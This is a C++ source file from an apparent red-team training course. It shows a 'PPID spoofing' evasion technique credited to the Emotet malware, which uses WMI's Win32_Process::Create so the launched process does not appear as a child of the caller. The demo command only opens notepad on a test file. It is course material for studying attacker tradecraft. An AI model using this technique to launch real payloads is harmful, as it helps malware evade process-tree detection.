/*

 Red Team Operator course code template
 PPID spoofing - Emotet method (WMI)
 
 author: reenz0h (twitter: @SEKTOR7net)
 credits: Microsoft
 
*/
#define _WIN32_DCOM
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char ** argv) {
    HRESULT hres;

    // initialize COM library
    hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
    if (FAILED(hres)) {
		printf("Failed to initialize COM library. Error code = 0x%x\n", hres);
        return 1;
    }

    // set COM security levels
    hres =  CoInitializeSecurity(
								NULL, 
								-1,                          // COM negotiates service
								NULL,                        // Authentication services
								NULL,                        // Reserved
								RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
								RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
								NULL,                        // Authentication info
								EOAC_NONE,                   // Additional capabilities 
								NULL                         // Reserved
								);

    if (FAILED(hres)) {
		printf("Failed to initialize security. Error code = 0x%x\n", hres);
        CoUninitialize();
        return 1;
    }

    // get the initial locator to WMI
    IWbemLocator * pLoc = NULL;
    hres = CoCreateInstance(
							CLSID_WbemLocator,
							0, 
							CLSCTX_INPROC_SERVER, 
							IID_IWbemLocator, (LPVOID *) &pLoc);
 
    if (FAILED(hres)) {
		printf("Failed to create IWbemLocator object. Error code = 0x%x\n", hres);
        CoUninitialize();
        return 1;
    }

    // connect to the local root\cimv2 namespace
    // and obtain pointer pSvc to make IWbemServices calls.
    IWbemServices * pSvc = NULL;
    hres = pLoc->ConnectServer(
							_bstr_t(L"ROOT\\CIMV2"), 
							NULL,
							NULL, 
							0, 
							NULL, 
							0, 
							0, 
							&pSvc
							);

    if (FAILED(hres)) {
		printf("Could not connect. Error code = 0x%x\n", hres);
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

	printf("Connected to ROOT\\CIMV2 WMI namespace\n");

    // set security levels for the proxy
    hres = CoSetProxyBlanket(
							pSvc,                        // Indicates the proxy to set
							RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
							RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
							NULL,                        // Server principal name 
							RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
							RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
							NULL,                        // client identity
							EOAC_NONE                    // proxy capabilities 
							);

    if (FAILED(hres)) {
		printf("Could not set proxy blanket. Error code = 0x%x\n", hres);
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // use the IWbemServices pointer to make requests of WMI
    // set up to call the Win32_Process::Create method
    BSTR ClassName = SysAllocString(L"Win32_Process");
    BSTR MethodName = SysAllocString(L"Create");

    IWbemClassObject * pClass = NULL;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);

    IWbemClassObject * pInParamsDefinition = NULL;
    hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);

    IWbemClassObject * pClassInstance = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

    // create the values for the in parameters
    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(L"notepad.exe c:\\rto\\boom.txt");

    // store the value for the in parameters
    hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
    wprintf(L"The command is: %s\n", V_BSTR(&varCommand));

	
    // and finally - execute method
    IWbemClassObject * pOutParams = NULL;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hres)) {
		printf("Could not execute method. Error code = 0x%x\n", hres);
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // To see what the method returned,
    // use the following code.  The return value will
    // be in &varReturnValue
    VARIANT varReturnValue;
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);

	wprintf(L"Return value: %s\n", V_BSTR(&varReturnValue));

    // clean up
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);
    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pLoc->Release();
    pSvc->Release();
    CoUninitialize();
    return 0;
}
